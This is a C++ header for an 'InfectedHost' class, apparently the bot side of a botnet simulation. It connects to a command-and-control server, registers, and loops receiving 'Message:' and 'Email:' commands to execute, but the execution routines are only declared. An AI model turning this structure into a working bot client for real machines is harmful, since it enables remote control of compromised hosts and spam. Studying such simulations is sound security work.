#ifndef INFECTEDHOST_H
#define	INFECTEDHOST_H

#include <iostream>
#include <fstream>
#include <cstdlib>
#include <cstring>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>
#include <iostream>
#include <fstream>
#include <sys/time.h>
#include  <signal.h>
#include "ProcessDetails.h"

extern void SIGINT_handler(int);
extern string gettimeinbuffer(timeval time_val);

struct SendMessageArgs
{
    ProcessDetails *targetDetails;
    string message;
};

void *HostSendMessageThread(void *args);
void *host_listening_thread(void * args);

class InfectedHost
{
private:
    string infected_host_configuration_file;
    char temp[1024];
    int cnc_port;
    int cncSocket;
    string host_output_filename;
    ProcessDetails myDetails;
    bool LoadConfigurations();
    int CreateListeningSocket();
    bool OpenOutputFileHandler();
    void ExecuteMessage(char *command);
    void ExecuteEmail(char *command);
    void EstablishConnectionWithCNCServer();
    void RegisterWithCNCServer();
    void LogMessage(char *message);
public:
    void SetConfigurationFileName(string configuration_file_name)
    {
        infected_host_configuration_file.assign(configuration_file_name);
    }
    void SetHostName(string name)
    {
        myDetails.processName.assign(name);
    }
    void Start()
    {
        signal(SIGUSR1, SIGINT_handler);
        timeval signalTime;
        myDetails.processID = getpid();
        
        //loading configurations from configurations file
        if (!LoadConfigurations())
        {
            perror("cannot open infected host configuration file");
            return;
        }
        
        if (!OpenOutputFileHandler())
        {
            perror("host output file");
        }
        myDetails.file_writer.close();
        
        myDetails.portNumber = CreateListeningSocket();
        EstablishConnectionWithCNCServer();
        //logging connected to C&C server message
        memset(temp, 0, sizeof(temp));
        sprintf(temp, "%s port(%d) pid(%d): connected_to_cnc_server", myDetails.processName.c_str(), myDetails.portNumber, myDetails.processID);
        LogMessage(temp);
        
        RegisterWithCNCServer();
        
        
        //receiving and executing commands from C&C server
        while (true)
        {
            memset(temp, 0, sizeof(temp));
            int res = recv(cncSocket, (void*)temp, sizeof(temp), 0);
            if (res==0){
                perror("C&C Server closed");
                return;
            }
            else if (res<0){
                perror("Error recv");
            }
            if (strncmp(temp, "Message:", 8)==0)
            {
                ExecuteMessage(temp);
            }
            else if (strncmp(temp, "Email:", 6)==0)
            {
                ExecuteEmail(temp);
            }
        }
        gettimeofday(&signalTime, 0);
        //cout<<myname<<" terminating at "<<gettimeinbuffer(signalTime)<<endl;
        myDetails.file_writer.close();
    }
};


#endif	/* INFECTEDHOST_H */


